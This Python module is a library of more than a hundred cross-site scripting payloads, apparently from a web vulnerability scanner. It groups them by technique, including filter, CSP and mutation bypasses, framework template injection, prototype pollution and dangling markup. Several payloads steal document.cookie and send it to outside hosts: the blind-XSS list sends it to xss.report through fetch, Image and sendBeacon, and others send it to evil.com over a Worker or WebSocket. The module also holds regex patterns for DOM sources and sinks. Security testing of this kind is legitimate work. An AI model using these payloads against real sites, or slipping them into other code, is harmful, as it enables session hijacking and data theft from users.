"""
XSS Payloads — Comprehensive library organized by technique.
100+ payloads covering reflected, DOM, stored, polyglots, context-aware,
event handlers, and filter bypass vectors.
"""

# ── Basic Reflected XSS ──────────────────────────────────────────────────────
BASIC_REFLECTED = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<svg/onload=alert(1)>',
    '<body onload=alert("XSS")>',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<math><mtext><table><mglyph><svg onload=alert(1)>',
    '<isindex action="javascript:alert(1)">',
]

# ── Event Handler Payloads (30+) ─────────────────────────────────────────────
EVENT_HANDLERS = [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<div onmouseover=alert(1)>hover</div>',
    '<div onmouseout=alert(1)>hover</div>',
    '<a onmouseover=alert(1)>hover</a>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<button onclick=alert(1)>click</button>',
    '<form onsubmit=alert(1)><input type=submit>',
    '<img src=x onload=alert(1)>',
    '<image src=x onerror=alert(1)>',
    '<table background="javascript:alert(1)">',
    '<div style="width:expression(alert(1))">',
    '<object onerror=alert(1)>',
    '<script>confirm(1)</script>',
    '<script>prompt(1)</script>',
    '<body onhashchange=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body onfocus=alert(1)>',
    '<keygen onfocus=alert(1) autofocus>',
    '<meter onmouseover=alert(1)>0</meter>',
    '<form><button formaction=javascript:alert(1)>click',
    '<base href="javascript:alert(1)//">',
    '<a href="javascript:alert(1)">click</a>',
]

# ── Tag Injection Payloads ───────────────────────────────────────────────────
TAG_INJECTION = [
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "'-alert(1)-'",
    "'-alert(1)//",
    '</script><script>alert(1)</script>',
    '</title><script>alert(1)</script>',
    '</textarea><script>alert(1)</script>',
    '</style><script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
]

# ── Attribute Injection (breaking out of HTML attributes) ─────────────────────
ATTRIBUTE_INJECTION = [
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '" onload="alert(1)',
    '" onerror="alert(1)',
    '"><script>alert(1)</script><"',
    "' onclick='alert(1)'",
    '`onmouseover=alert(1)',
    '" style="background:url(javascript:alert(1))',
]

# ── JavaScript Context (breaking out of JS strings) ──────────────────────────
JS_CONTEXT = [
    "';alert(1);//",
    '";alert(1);//',
    "\\';alert(1);//",
    '\\"};alert(1);//',
    "</script><script>alert(1)</script>",
    "'-alert(1)-'",
    '"-alert(1)-"',
    "';alert(String.fromCharCode(88,83,83))//",
    "`-alert(1)-`",
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
]

# ── URL Context ──────────────────────────────────────────────────────────────
URL_CONTEXT = [
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "java%0ascript:alert(1)",
    "java%09script:alert(1)",
    "java%0dscript:alert(1)",
    "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
]

# ── Polyglot Payloads (work in multiple contexts) ────────────────────────────
POLYGLOTS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleport//&1teleport/teleport//</style></title></textarea></noscript></template></select></script>-->&lt;svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    "'\"><img src=x onerror=alert(1)//>",
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<svg/onload=alert(1)>",
    "\">'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "\"><svg onload=alert(1)//",
    "'-alert(1)-'",
]

# ── Template Injection (SSTI detection via XSS) ─────────────────────────────
TEMPLATE_INJECTION = [
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{7*7}',
    '{{constructor.constructor("return 1")()}}',
    '{{config}}',
    '${T(java.lang.Runtime).getRuntime()}',
]

# ── Filter Bypass / Encoding Tricks ──────────────────────────────────────────
FILTER_BYPASS = [
    # Case variations
    '<ScRiPt>alert(1)</ScRiPt>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<sVg OnLoAd=alert(1)>',
    # Null byte injection
    '<scr%00ipt>alert(1)</scr%00ipt>',
    '<%00script>alert(1)</script>',
    # Double encoding
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    # HTML entities
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    # Unicode
    '<script>\\u0061lert(1)</script>',
    '<script>al\\u0065rt(1)</script>',
    # Whitespace tricks
    '<script >alert(1)</script >',
    '<script\t>alert(1)</script>',
    '<script\n>alert(1)</script>',
    '<script\r>alert(1)</script>',
    # Tag mangling
    '<<script>alert(1)//',
    '<script x>alert(1)</script>',
    '<script/x>alert(1)</script>',
    # Without parentheses
    '<img src=x onerror=alert`1`>',
    '<svg onload=alert&lpar;1&rpar;>',
    # Without alert keyword
    '<img src=x onerror=confirm(1)>',
    '<img src=x onerror=prompt(1)>',
    '<img src=x onerror=window["al"+"ert"](1)>',
    '<img src=x onerror=top["al"+"ert"](1)>',
    '<img src=x onerror=self["al"+"ert"](1)>',
]

# ── DOM XSS Sources ──────────────────────────────────────────────────────────
DOM_SOURCES = [
    r'document\.URL',
    r'document\.documentURI',
    r'document\.referrer',
    r'document\.baseURI',
    r'location\.href',
    r'location\.search',
    r'location\.hash',
    r'location\.pathname',
    r'window\.name',
    r'window\.location',
    r'document\.cookie',
    r'history\.pushState',
    r'history\.replaceState',
    r'localStorage\.',
    r'sessionStorage\.',
    r'postMessage\s*\(',
    r'MessageEvent\.data',
    r'URLSearchParams',
    r'\.getAttribute\s*\(\s*["\'](?:href|src|data|action)',
    r'\.dataset\.',
]

# ── DOM XSS Sinks ────────────────────────────────────────────────────────────
DOM_SINKS = [
    r'document\.write\s*\(',
    r'document\.writeln\s*\(',
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'\.insertAdjacentHTML\s*\(',
    r'eval\s*\(',
    r'setTimeout\s*\(\s*["\']',
    r'setInterval\s*\(\s*["\']',
    r'new\s+Function\s*\(',
    r'document\.location\s*=',
    r'window\.location\s*=',
    r'location\.href\s*=',
    r'location\.assign\s*\(',
    r'location\.replace\s*\(',
    r'\.src\s*=',
    r'\.href\s*=',
    r'\.action\s*=',
    r'jQuery\s*\(\s*["\'].*["\']',
    r'\$\s*\(\s*["\'].*["\']',
    r'\.html\s*\(',
    r'\.append\s*\(',
    r'\.prepend\s*\(',
    r'\.after\s*\(',
    r'\.before\s*\(',
    r'\.replaceWith\s*\(',
]

# Unique canary for detecting reflection
CANARY = 'swai9x7z'

# ── Mutation XSS — Browser parser quirks exploitation ─────────────────────────
# These exploit differences between HTML parsing and DOM mutation
MUTATION_XSS = [
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<table><colgroup><col style="x:expression(alert(1))">',
    '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
    '<svg><desc><table><thead><tr><td><style><!--</style><img src=x onerror=alert(1)>',
    '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>]]>',
    '<a href="&#x6a;avascript:alert(1)">click',
    '<svg/onload=\u0061lert(document.domain)>',
    '<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">',
    '<div id=x tabindex=1 onfocus=alert(1)></div>',
    '<details/open/ontoggle=alert(1)>',
    '<video/poster=javascript:alert(1)//>',
]

# ── CSP Bypass Payloads — Techniques to bypass Content Security Policy ─────────
CSP_BYPASS = [
    # Script gadgets from trusted CDNs
    '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>'
    '<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}',
    # JSONP endpoints
    '<script src="/api/callback?callback=alert(1)//"></script>',
    '<script src="/jsonp?callback=alert(1)//"></script>',
    # base-uri bypass
    '<base href="https://evil.com/"><script src="/js/app.js"></script>',
    # object-src bypass
    '<object data="data:text/html,<script>alert(1)</script>">',
    # Trusted types bypass attempts
    '<div onclick="window[\'al\'+\'ert\'](1)">click</div>',
    # style-src bypass with CSS injection
    '<style>@import "https://evil.com/steal.css";</style>',
    # Worker-based bypass
    '<script>new Worker("data:text/javascript,fetch(\'https://evil.com?c=\'+document.cookie)")</script>',
    # prefetch/preload based
    '<link rel=prefetch href="//evil.com">',
    '<link rel=preload href="//evil.com" as=script>',
    # Meta redirect (bypasses some CSP configs)
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
]

# ── DOM Clobbering — Override DOM properties via HTML elements ────────────────
DOM_CLOBBERING = [
    '<a id=x><a id=x name=y href=javascript:alert(1)>',
    '<form id=x><input name=y value=javascript:alert(1)>',
    '<img name=domain src=evil.com>',  # Clobber document.domain
    '<a id=defaultValue href=javascript:alert(1)>',
    '<form id=location href=javascript:alert(1)>',
]


# ── Framework-Specific XSS (Angular, React, Vue, jQuery) ──────────────────────
FRAMEWORK_XSS = [
    # Angular (AngularJS 1.x)
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    '{{"a]b".constructor.prototype.charAt=[].join;$eval("x]alert(1)")}}',
    '{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}',
    '{{"a]b]c".constructor.prototype.charAt="".valueOf;$eval("x]alert(1)")}}',
    '{{["a]b]c"].constructor.prototype.join=[].constructor("alert(1)")}}',
    '<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>',
    '<div ng-app>{{constructor.constructor(\'alert(1)\')()}}</div>',
    '{{$new.constructor("alert(1)")()}}',
    '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}',
    # Angular (modern 2+)
    '<img [src]="constructor.constructor(\'alert(1)\')()" >',
    '<div [innerHTML]="\'<img src=x onerror=alert(1)>\'"></div>',
    # React-specific (dangerouslySetInnerHTML abuse)
    '{"__html":"<img src=x onerror=alert(1)>"}',
    'javascript:alert(1)//react-router',
    '<a href="javascript:alert(1)">',  # React href bypass
    # Vue.js
    '{{_c.constructor("alert(1)")()}}',
    '{{_v.constructor("alert(1)")()}}',
    '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
    '{{this.constructor.constructor("alert(1)")()}}',
    '<p v-if="constructor.constructor(\'alert(1)\')()">',
    # jQuery
    '<img src=x onerror="$.globalEval(\'alert(1)\')">',
    '<div id="<img src=x onerror=alert(1)>">',
    '<script>$(\'body\').html(\'<img src=x onerror=alert(1)>\')</script>',
    # Knockout.js
    '<div data-bind="html: \'<img src=x onerror=alert(1)>\'">',
    '<div data-bind="attr: {onclick: \'alert(1)\'}">click</div>',
    # Ember.js / Handlebars
    '{{#if true}}<script>alert(1)</script>{{/if}}',
    # Svelte
    '{@html "<img src=x onerror=alert(1)>"}',
]

# ── Blind XSS Payloads — Trigger in admin panels, logs, emails ─────────────
BLIND_XSS = [
    '<script>new Image().src="https://xss.report/c/test?"+document.cookie</script>',
    '<img src=x onerror="new Image().src=\'https://xss.report/c/test?\'+document.cookie">',
    '"><script>fetch("https://xss.report/c/test?c="+document.cookie)</script>',
    '<svg onload="fetch(\'https://xss.report/c/test?c=\'+document.cookie)">',
    '"><img src=x onerror=fetch("https://xss.report/c/test?c="+document.cookie)>',
    '<script>var i=new Image();i.src="https://xss.report/c/test?"+document.domain</script>',
    '<input onfocus="fetch(\'https://xss.report/c/test?d=\'+document.domain)" autofocus>',
    '<details open ontoggle="fetch(\'https://xss.report/c/test?c=\'+document.cookie)">',
    '"><script src=https://xss.report/s/test></script>',
    '<img src=x onerror="var x=new XMLHttpRequest();x.open(\'GET\',\'https://xss.report/c/test?\'+document.cookie);x.send()">',
    '<script>navigator.sendBeacon("https://xss.report/c/test",document.cookie)</script>',
    '"><img/src/onerror=navigator.sendBeacon("https://xss.report/c/test",document.cookie)>',
]

# ── SVG-Based XSS ─────────────────────────────────────────────────────────────
SVG_XSS = [
    '<svg><script>alert(1)</script></svg>',
    '<svg onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x to=1>',
    '<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a></svg>',
    '<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>',
    '<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">',
    '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    '<svg><image href="javascript:alert(1)">',
    '<svg><script xlink:href="data:text/javascript,alert(1)"></script></svg>',
    '<svg viewBox="0 0 100 100"><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=50/></a></svg>',
]

# ── MathML-Based XSS ──────────────────────────────────────────────────────────
MATHML_XSS = [
    '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
    '<math><mi><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">',
    '<math><mtext><table><mglyph><svg><mtext><mglyph><svg onload=alert(1)>',
    '<math href="javascript:alert(1)">click</math>',
    '<math><maction actiontype="toggle"><mtext>click</mtext></maction><script>alert(1)</script></math>',
]

# ── Advanced Encoding / Obfuscation ─────────────────────────────────────────
ADVANCED_ENCODING = [
    # JSFuck-style
    '<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(alert(1))</script>',
    # Octal/hex escape
    '<script>\\141\\154\\145\\162\\164(1)</script>',
    '<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>',
    # Unicode escape
    '<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>',
    # String.fromCharCode
    '<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>',
    # atob
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    # constructor chain
    '<script>[].constructor.constructor("alert(1)")()</script>',
    '<script>"".constructor.constructor("alert(1)")()</script>',
    # Regex constructor
    '<script>/x]/.constructor.constructor("alert(1)")()</script>',
    # setTimeout/setInterval with string
    '<img src=x onerror="setTimeout(\'alert(1)\',0)">',
    '<img src=x onerror="setInterval(\'alert(1)\',0)">',
    # document.write
    '<img src=x onerror="document.write(\'<script>alert(1)<\\/script>\')">',
    # import()
    '<script>import("data:text/javascript,alert(1)")</script>',
    # globalThis
    '<script>globalThis["al"+"ert"](1)</script>',
    '<script>self["al"+"ert"](1)</script>',
    '<script>parent["al"+"ert"](1)</script>',
    '<script>top["al"+"ert"](1)</script>',
    '<script>frames["al"+"ert"](1)</script>',
    # Proxy-based
    '<script>new Proxy({},{get:(_,p)=>alert(p)})+""</script>',
]

# ── Prototype Pollution XSS ─────────────────────────────────────────────────
PROTOTYPE_POLLUTION = [
    '__proto__[innerHTML]=<img/src/onerror=alert(1)>',
    'constructor[prototype][innerHTML]=<img/src/onerror=alert(1)>',
    '__proto__[src]=data:text/html,<script>alert(1)</script>',
    '__proto__[onload]=alert(1)',
    'constructor.prototype.src=data:text/html,<script>alert(1)</script>',
    '__proto__[srcdoc]=<script>alert(1)</script>',
    '__proto__[href]=javascript:alert(1)',
    '__proto__[action]=javascript:alert(1)',
    '__proto__[formaction]=javascript:alert(1)',
    '__proto__[data]=javascript:alert(1)',
]

# ── HTTP Header Injection XSS ────────────────────────────────────────────────
HEADER_XSS = [
    # Referer
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    # User-Agent
    '<script>alert(document.cookie)</script>',
    '"><svg onload=alert(1)>',
    # X-Forwarded-For
    '<img src=x onerror=alert(1)>',
    # Cookie
    '<script>alert(1)</script>',
]

# ── Payload-less / Dangling Markup ───────────────────────────────────────────
DANGLING_MARKUP = [
    '<img src="https://evil.com/steal?',
    '<a href="https://evil.com/steal?',
    '<form action="https://evil.com/steal"><button>Submit</button>',
    '<base href="https://evil.com/">',
    '<meta http-equiv="refresh" content="0;url=https://evil.com/">',
    '<link rel="import" href="https://evil.com/steal">',
    '<object data="https://evil.com/steal">',
    '<input type="hidden" name="token" value="',
    '<textarea>',  # Capture everything until next </textarea>
    '<style>@import "https://evil.com/steal.css";</style>',
]

# ── Additional Advanced Polyglots ────────────────────────────────────────────
ADVANCED_POLYGLOTS = [
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    '"><svg/onload=alert(1)//<p/hidden/class="--></title></style></textarea></script>',
    "--></script></title></style>\"><img src=x onerror=alert(1)>",
    "'-alert(1)//\\'-alert(1)//{{'\\\\'-alert(1)//",
    "`-alert(1)-`",
    "</script/x]>][img/src=x onerror=alert(1)]>",
    "{{7*7}}${7*7}<%= 7*7 %>#{ 7*7}",  # SSTI + XSS polyglot
    '<x]y onclick=alert(1)>click',
    '<img/src="x"onerror="alert(1)">',
    '</SCRIPT>">\'>< img src=x onerror=alert(1)>//',
]

# ── Service Worker XSS ──────────────────────────────────────────────────────
SERVICE_WORKER_XSS = [
    '<script>navigator.serviceWorker.register("/xss.js")</script>',
    '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'fetch\',e=>e.respondWith(new Response(\'<script>alert(1)<\\/script>\',{headers:{\'Content-Type\':\'text/html\'}})))")</script>',
]

# ── WebSocket XSS ────────────────────────────────────────────────────────────
WEBSOCKET_XSS = [
    '<script>var ws=new WebSocket("wss://evil.com");ws.onopen=function(){ws.send(document.cookie)}</script>',
    '<img src=x onerror="var ws=new WebSocket(\'wss://evil.com\');ws.onopen=()=>ws.send(document.cookie)">',
]

# ── Additional Reflected / Edge Cases ────────────────────────────────────────
EDGE_CASE_XSS = [
    # Backtick XSS
    '<img src=x onerror=alert`1`>',
    '<svg onload=confirm`1`>',
    '<body onload=prompt`1`>',
    # Content-type bypass
    'text/html;charset=utf-7+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
    # Double encoding edge
    '%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e',
    # CRLF + XSS
    '%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>',
    # PHP-specific
    '<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>',
    # XML-based
    '<![CDATA[<script>alert(1)</script>]]>',
    # Comment bypass
    '<!--<script>alert(1)//-->',
    '<comment><img src=x onerror=alert(1)></comment>',
    # Form-based  
    '<form><button formaction=javascript:alert(1)>X',
    '<form><input type=submit formaction=javascript:alert(1)>',
    # Meta-refresh
    '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
    # Multiline payload
    '<script>\nalert\n(\n1\n)\n</script>',
    # Zero-width joiners
    '<scr\u200bipt>alert(1)</sc\u200bript>',
]


def get_all_xss_payloads() -> list:
    """Return combined list of all XSS payloads for deep scans."""
    return (
        BASIC_REFLECTED + EVENT_HANDLERS + TAG_INJECTION +
        ATTRIBUTE_INJECTION + JS_CONTEXT + URL_CONTEXT +
        POLYGLOTS + TEMPLATE_INJECTION + FILTER_BYPASS +
        MUTATION_XSS + CSP_BYPASS + DOM_CLOBBERING +
        FRAMEWORK_XSS + BLIND_XSS + SVG_XSS + MATHML_XSS +
        ADVANCED_ENCODING + PROTOTYPE_POLLUTION + HEADER_XSS +
        DANGLING_MARKUP + ADVANCED_POLYGLOTS + SERVICE_WORKER_XSS +
        WEBSOCKET_XSS + EDGE_CASE_XSS
    )


def get_xss_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate XSS payloads."""
    if depth == 'shallow':
        return BASIC_REFLECTED[:6] + POLYGLOTS[:2]
    elif depth == 'medium':
        return (BASIC_REFLECTED + TAG_INJECTION[:5] +
                ATTRIBUTE_INJECTION[:5] + POLYGLOTS + TEMPLATE_INJECTION[:4] +
                FRAMEWORK_XSS[:5] + BLIND_XSS[:3] + SVG_XSS[:3])
    else:  # deep
        return get_all_xss_payloads()
